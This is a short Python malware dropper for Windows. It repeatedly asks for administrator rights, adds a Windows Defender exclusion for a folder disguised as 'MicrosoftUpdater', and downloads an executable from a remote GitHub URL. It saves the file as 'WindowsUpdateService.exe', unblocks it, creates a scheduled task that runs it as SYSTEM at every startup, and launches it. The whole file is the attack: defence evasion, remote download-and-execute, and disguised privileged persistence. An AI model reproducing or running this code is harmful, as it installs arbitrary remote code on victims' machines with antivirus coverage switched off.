import sys, ctypes, subprocess
from time import sleep

SCRIPT_PATH = "C:/ProgramData/MicrosoftUpdater/"
SCRIPT_FILE_PATH = f"{SCRIPT_PATH}WindowsUpdateService.exe"
FILE_URL = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/file.exe"

def run():
    subprocess.run([ "powershell.exe", "-Command", f"Add-MpPreference -ExclusionPath '{SCRIPT_PATH}'" ])
    subprocess.run([ "curl", "-o", SCRIPT_FILE_PATH, FILE_URL ])

    subprocess.run([ "powershell.exe", "-Command", f"Unblock-File -Path '{SCRIPT_FILE_PATH}'" ])

    subprocess.run([ "schtasks", "/create", "/tn", "Updater", "/tr", SCRIPT_FILE_PATH, "/sc", "onstart", "/ru", "SYSTEM", "/rl", "highest", "/f"])

    subprocess.run([ "start", SCRIPT_FILE_PATH ])


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except AttributeError:
        return False

def run_as_admin():
    if not is_admin():
        ret = ctypes.windll.shell32.ShellExecuteW(
            None,
            "runas",
            sys.executable,
            " ".join([f'"{arg}"' for arg in sys.argv]),
            None,
            1
        )
        if ret <= 32:
            run_as_admin()
    else:
        run()

run_as_admin()
